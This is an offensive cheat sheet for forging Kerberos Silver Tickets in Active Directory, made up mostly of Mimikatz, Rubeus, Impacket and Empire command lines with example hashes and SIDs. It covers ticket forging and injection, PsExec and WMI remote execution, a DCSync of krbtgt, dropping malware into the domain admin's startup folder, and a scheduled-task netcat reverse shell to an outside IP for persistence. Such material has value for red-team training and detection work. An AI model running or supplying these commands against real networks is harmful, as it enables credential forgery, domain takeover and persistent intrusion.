# SILVER TICKET

### Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.

#### 1) 

    mimikatz.exe

#### 2) 
    privilege::debug

#### 3) 

    lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN

### 1) Create a ticket for the service

    mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:

    mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-134912914

### 2) Use same steps as a golden ticket

    mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /rc4:HASH /user:USER /service:SERVICE /target:TARGET"

### Inject the ticket

    mimikatz.exe "kerberos::ptt TICKET_FILE"

    .\Rubeus.exe ptt /ticket:TICKET_FILE

### Obtain a shell

    .\PsExec.exe -accepteula \\TARGET cmd

## Silver Ticket on Linux

    python ticketer.py -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn SERVICE_PRINCIPAL_NAME USER

    export KRB5CCNAME=/root/impacket-examples/TICKET_NAME.ccache 

    python psexec.py DOMAIN/USER@TARGET -k -no-pass

## Services to target with a Silver Ticket

### Service Type --> Service Silver Tickets --> Attack

#### 1) WMI --> HOST + RPCSS --> 

    wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"

#### 2) Powershell Remoting --> CIFS + HTTP + (wsman?) --> 

    New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC

#### 3) WinRM --> HTTP+ wsman --> 

    New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC

#### 4) Scheduled Tasks --> HOST --> 

    schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"

#### 5) Windows File Share (CIFS) --> CIFS --> 

    dir \\dc01\c$

#### 6) LDAP operations including Mimikatz DCSync --> LDAP --> 

    lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt

#### 7) Windows Remote Server Administration Tools (RSAT) --> RPCSS + LDAP + CIFS --> /

# Silver Ticket Example

## Requirements: Machine account NTLM hash

### 1) Mimikatz

##### RC4

    Invoke-Mimikatz -Command '"kerberos::golden /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /target:dc01.security.local /service:CIFS /rc4:53b82af68b0faf6587971fe807fad960 /user:Viper /ptt"'

##### AES256

    Invoke-Mimikatz -Command '"kerberos::golden /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /target:dc01.security.local /service:CIFS /aes256:4d8daf60cf15651b283c9c180b04d4bd68a5b06592c0007697ae8de0700a21d5 /user:Viper /ptt"'

##### Open a new command prompt since we created and injected the ticket

    Invoke-Mimikatz -Command "misc::cmd"

##### Check if ticket has retained in the new session

    klist

##### List the C$ contents of our target

    dir \\DC01.domain.local\C$ (Cmd)

    ls -force \\DC01.domain.local\C$ (Powershell)

### 2) Rubeus

##### Forge and inject directly into the current process

    Rubeus.exe silver /service:cifs/dc01.security.local /aes256:f9647c8dba66c6576057167ab18d93582ea7fa1a8fd9b03b79d7d173644ff2e4 /user:Administrator /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /nowrap /ptt

OR

##### Forge and inject into new process (Cleaner)

# Forge silver ticket

    Rubeus.exe silver /service:cifs/dc01.security.local /aes256:f9647c8dba66c6576057167ab18d93582ea7fa1a8fd9b03b79d7d173644ff2e4 /user:Administrator /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /nowrap

##### Createnetonly process, username and password can be anything

    Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:Security.local /username:Administrator /password:NotRealPass

##### Take note of the LUID value of the output (IMPORTANT!). Inject the silver ticket into the new LUID session

    Rubeus.exe ptt /luid:0x12e0ab8 /ticket:doIFuj[...snip...]lDLklP

##### Impersonate the process token using the ProcessID from the output of the newly created process (Createnetonly)

    Invoke-SharpImpersonation -Command "pid:[PID]"

##### Check that the silver ticket has retained in our new shell process.

    klist

### 3) Empire C2

    powershell/credentials/mimikatz/silver_ticket

# Post Exploitation Techniques Examples

## Map drive

    net use Z: \\dc01.security.local\C$

## Copy malware to Domain Administrator startup folder on DC

    copy .\MaliciousFile.exe "\\dc01.security.local\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

## CMD 

    .\PsExec.exe -accepteula \\dc01.security.local cmd

## Netcat

    schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\Administrator\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'

# Other ticket combinations

| Technique           | Required Service Ticket |
|---------------------|--------------------------|
| PSexec              | CIFS                     |
| WinRm               | HOST & HTTP              |
| DCSync (DCs only)   | LDAP                     |
